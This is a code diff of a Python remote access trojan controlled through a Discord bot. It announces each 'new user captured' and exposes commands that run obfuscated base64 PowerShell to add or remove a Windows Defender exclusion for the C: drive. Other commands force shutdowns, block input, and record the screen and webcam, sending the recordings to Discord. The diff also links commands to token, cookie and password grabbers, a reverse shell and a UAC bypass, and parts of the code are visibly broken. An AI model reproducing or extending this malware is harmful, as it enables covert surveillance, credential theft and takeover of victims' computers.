@@ -16,7 +16,12 @@ NON_STANDARD_PACKAGES = [
     "opencv-python",
     "numpy",
     "pywin32",
-    "pygame"
+    "pygame",
+    "pycaw",
+    "pillow",
+    "pycryptodome",
+    "comtypes",
+    "requests"
 ]
 
 def install_packages():
@@ -63,7 +68,7 @@ intents.guilds = True
 intents.members = True
 
 bot = commands.Bot(command_prefix="!", intents=intents)
-
+category_id="replaceme --> in builder category id"
 @bot.event
 async def on_ready():
     print(f"Logged in as {bot.user.name}")
@@ -85,22 +90,22 @@ async def on_ready():
         await channel.send(f"New user captured: {pc_username}!")
 
 @bot.command()
-async def exc_1(ctx):
+async def exclusion(ctx):
     await ctx.send("3xc1usion has ben sent to the reg") 
     subprocess.run("powershell -enc cgBlAGcAIABhAGQAZAAgACIASABLAEwATQBcAFMATwBGAFQAVwBBAFIARQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwAgAEQAZQBmAGUAbgBkAGUAcgBcAEUAeABjAGwAdQBzAGkAbwBuAHMAXABQAGEAdABoAHMAIgAgAC8AdgAgAEMAOgBcAA==")
 
 @bot.command()
-async def exc_rem2(ctx):
+async def remove_exclusion(ctx):
     await ctx.send("3xc1usion has been removed from the reg")
     subprocess.run("powershell -enc UgBlAG0AbwB2AGUALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACIASABLAEwATQA6AFwAUwBPAEYAVABXAEEAUgBFAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzACAARABlAGYAZQBuAGQAZQByAFwARQB4AGMAbAB1AHMAaQBvAG4AcwBcAFAAYQB0AGgAcwAiACAALQBOAGEAbQBlACAAIgBDADoAXAAiAA0ACgA=")
 
 @bot.command()
-async def rest_lap(ctx, seconds, message):
+async def restart(ctx, seconds, message):
     await ctx.send(f"System will poweroff in {seconds}.")
     subprocess.run(f'shutdown /s /t {seconds} /c "{message}"', shell=True)
 
 @bot.command()
-async def eyes_0(ctx, seconds: int):
+async def screenshot_screen(ctx, seconds: int):
     await ctx.send(f"Starting screenshot capture for {seconds} seconds...")
     for i in range(seconds):
         filename = f"screenshot_{i}.png"
@@ -119,7 +124,7 @@ async def eyes_0(ctx, seconds: int):
 
 
 @bot.command()
-async def no_move(ctx, duration: int):
+async def dis_input(ctx, duration: int):
     """
     Blocks keyboard and mouse input for `duration` seconds.
     WARNING: Use carefully, as it will make the computer unresponsive temporarily.
@@ -283,7 +288,7 @@ async def send_video_file(ctx, video_filename):
         return False
 
 @bot.command()
-async def csnap(ctx, seconds: int):
+async def record_cam(ctx, seconds: int):
     """
     Records webcam video for the specified duration and sends it to Discord.
     """
@@ -337,7 +342,7 @@ async def csnap(ctx, seconds: int):
             os.remove(video_filename)
 
 @bot.command()
-async def recv(ctx, duration: int = 10):
+async def record_screen(ctx, duration: int = 10):
     """
     Records the screen for the specified duration and sends it to Discord.
     """
@@ -372,7 +377,7 @@ async def recv(ctx, duration: int = 10):
             os.remove(video_filename)
 
 @bot.command()
-async def recspli0(ctx, duration: int = 10):
+async def record_split(ctx, duration: int = 10):
     """
     Records both webcam and screen side-by-side for the specified duration and sends to Discord.
     """
@@ -572,36 +577,32 @@ async def startup(ctx):
         await ctx.send(f"❌ An unexpected error occurred: {e}")
  
 @bot.command()
-async def tkn_grab(ctx):
-    pass
+async def tkn_grab(ctx):#done
+    filename="discord_token_grabber.py"
 
 @bot.command()
-async def bsod(ctx):
-    pass
+async def bsod(ctx):#done
+    filename="bsod.py"
 
 @bot.command()
-async def get_cookies(ctx):
-    pass
+async def get_cookies(ctx):#done
+    filename="get_cookies.py"
 
 @bot.command()
-async def jumpscare(ctx):
-    pass
+async def pass_light(ctx):#done
+    filename="passwords_grabber.py"
 
 @bot.command()
-async def pass_light(ctx):
-    pass
+async def pass_heavy(ctx,bot_k,cat_id):#done
+    filename="gruppe.py"
 
 @bot.command()
-async def pass_heavy(ctx):
-    pass
-
-@bot.command()
-async def reverse_shell(ctx):
-    pass
+async def reverse_shell(ctx):#done
+    filename="reverse_shell"
 
 @bot.comand()
 async def uac(ctx):
-    pass
+    filename="uac_bypass.py"
 
 # Run the bot --> in the builder replace this
-bot.run('')
+bot.run('bot token here-->replace')
